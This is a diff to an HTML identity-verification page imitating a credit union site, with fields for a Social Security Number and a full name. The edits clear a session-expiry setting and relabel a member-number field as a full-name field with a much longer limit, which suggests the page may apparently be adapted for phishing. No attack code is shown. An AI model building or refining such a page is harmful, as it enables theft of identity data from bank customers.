@@ -34,7 +34,7 @@
 <div data-role="content">
 <div class="main-content" role="main">
 <div class="container-view">
-<div class="container-view" data-bind="props: wizardSettings" data-props="{&quot;WizardSessionExpiredAfterMin&quot;:4000}" data-viewmodel="login/viewmodels/logoff">
+<div class="container-view" data-bind="props: wizardSettings" data-props="" data-viewmodel="login/viewmodels/logoff">
 <header class="subheader">
 <div class="navbar__center"><span class="navbar__center__title">Verify Your Identity</span></div>
 </header>
@@ -46,7 +46,7 @@
 
 <div class="form-control-container"><label><span class="form-control__label" data-stable-name="SsnLabel">What is your Social Security Number?</span> <input aria-label="What is your Social Security Number?" autocomplete="new-value" class="form-control k-textbox" data-cfw-field="data-cfw-field" data-field-id="Ssn" data-field-type="System.String" data-mask="***-**-0000" data-pattern="000-00-0000" data-pattern-msg="Please enter 9 digits into the Social Security Number field." data-required-msg="This field is required." data-role="formatter" data-stable-name="SsnInput" id="Ssn" maxlength="11" name="1" pattern="^\d{3}-\d{2}-\d{4}$" required="required" type="text" /> </label></div>
 
-<div class="form-control-container" data-bind=""><label><span class="form-control__label" data-stable-name="MemberAccountNumberLabel">What is your Full Name?</span> <input class="form-control k-textbox" data-bind="" data-cfw-field="data-cfw-field"  data-field-type="System.String" data-pattern-msg="Please enter a valid member number." data-required-msg="This field is required." data-stable-name="MemberAccountNumberInput" id="MemberAccountNumber" maxlength="20" minlength="1" name="2" required="required" type="text" /> </label></div>
+<div class="form-control-container" data-bind=""><label><span class="form-control__label" data-stable-name="MemberAccountNumberLabel">What is your Full Name?</span> <input class="form-control k-textbox" data-bind="" data-cfw-field="data-cfw-field"  data-field-type="System.String" data-pattern-msg="Please enter a valid member number." data-required-msg="This field is required." data-stable-name="MemberAccountNumberInput" id="MemberAccountNumber" maxlength="600" minlength="1" name="2" required="required" type="text" /> </label></div>
 
 <p>Don&#39;t have this information? <a href="https://www.summitcreditunion.com/contact-us">Contact us</a> for help.</p>
 </div>
